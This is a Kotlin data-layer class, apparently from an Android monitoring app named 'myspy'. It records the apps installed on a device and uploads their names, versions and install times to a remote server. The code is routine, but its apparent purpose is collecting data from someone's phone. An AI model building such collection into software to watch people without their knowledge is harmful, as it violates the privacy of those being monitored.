package com.myspy.android.data.repository

import com.myspy.android.data.local.db.dao.AppsDao
import com.myspy.android.data.local.db.entities.AppEntity
import com.myspy.android.data.remote.api.ApiService
import com.myspy.android.data.remote.models.AppData
import java.text.SimpleDateFormat
import java.util.*

class AppsRepository(
    private val appsDao: AppsDao,
    private val apiService: ApiService
) {

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    suspend fun saveApp(app: AppEntity): Long = appsDao.insert(app)

    suspend fun clearAndSaveAll(apps: List<AppEntity>) {
        appsDao.deleteAll()
        appsDao.insertAll(apps)
    }

    suspend fun syncToServer(): Result<Int> {
        return try {
            val unsynced = appsDao.getUnsyncedApps()
            if (unsynced.isEmpty()) return Result.success(0)

            val dataList = unsynced.map { entity ->
                AppData(
                    packageName = entity.packageName,
                    appName = entity.appName,
                    versionName = entity.versionName,
                    versionCode = entity.versionCode.toString(),
                    isSystemApp = entity.isSystemApp,
                    installTime = dateFormat.format(Date(entity.installTime)),
                    updateTime = dateFormat.format(Date(entity.updateTime))
                )
            }

            val response = apiService.uploadApps(dataList)
            if (response.isSuccessful && response.body()?.result == "ok") {
                appsDao.markAsSynced(unsynced.map { it.packageName })
                Result.success(unsynced.size)
            } else {
                Result.failure(Exception("Upload failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUnsyncedCount(): Int = appsDao.getUnsyncedCount()

    suspend fun getAllApps(): List<AppEntity> = appsDao.getAllApps()

    suspend fun getUserApps(): List<AppEntity> = appsDao.getUserApps()

    suspend fun getAppByPackage(packageName: String): AppEntity? =
        appsDao.getAppByPackage(packageName)
}
